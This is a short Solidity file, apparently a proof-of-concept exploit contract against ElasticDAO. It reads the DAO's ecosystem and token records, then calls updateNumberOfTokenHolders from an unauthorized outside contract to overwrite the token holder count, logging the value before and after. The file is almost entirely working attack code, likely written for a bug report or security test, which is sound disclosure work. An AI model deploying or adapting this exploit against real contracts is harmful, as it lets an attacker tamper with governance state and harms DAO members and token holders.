// SPDX-License-Identifier: GPLv3
pragma solidity 0.7.2;
pragma experimental ABIEncoderV2;

import '../models/Ecosystem.sol';
import '../models/Token.sol';
import './ElasticDAO.sol';
import "hardhat/console.sol";

contract Exploit {
    function exploit(address payable _daoTarget, uint256 _amount) external {
        Ecosystem ecosystem = Ecosystem(ElasticDAO(_daoTarget).ecosystemModelAddress());
        Ecosystem.Instance memory ecoInstance = ecosystem.deserialize(_daoTarget);
        //console.log("Ecosystem daoAddress %s", ecoInstance.daoAddress);
        Token tokenStorage = Token(ecoInstance.tokenModelAddress);
        Token.Instance memory token_before = tokenStorage.deserialize(ecoInstance.governanceTokenAddress, ecoInstance);
        console.log("Token name %s uuid %s numberOfTokenHolders %s", token_before.name, token_before.uuid, token_before.numberOfTokenHolders);
        tokenStorage.updateNumberOfTokenHolders(token_before, _amount);
        Token.Instance memory token_after = tokenStorage.deserialize(ecoInstance.governanceTokenAddress, ecoInstance);
        console.log("Token name %s uuid %s numberOfTokenHolders %s", token_after.name, token_after.uuid, token_after.numberOfTokenHolders);
    }
}